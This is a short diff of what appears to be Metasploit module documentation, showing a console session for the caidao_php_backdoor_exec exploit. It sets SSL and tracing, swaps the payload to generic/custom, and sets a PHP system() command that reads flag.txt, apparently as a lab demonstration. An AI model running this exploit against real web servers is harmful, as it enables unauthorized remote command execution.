@@ -145,7 +145,7 @@ msf6 exploit(multi/http/caidao_php_backdoor_exec) > set HttpTrace true
 HttpTrace => true
 msf6 exploit(multi/http/caidao_php_backdoor_exec) > set SSL true
 SSL => true
-msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PAYLOAD payload/php/exec
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PAYLOAD generic/custom
 PAYLOAD => php/exec
 msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PAYLOADSTR "system('cat flag.txt');"
 PAYLOADSTR => system('cat flag.txt');
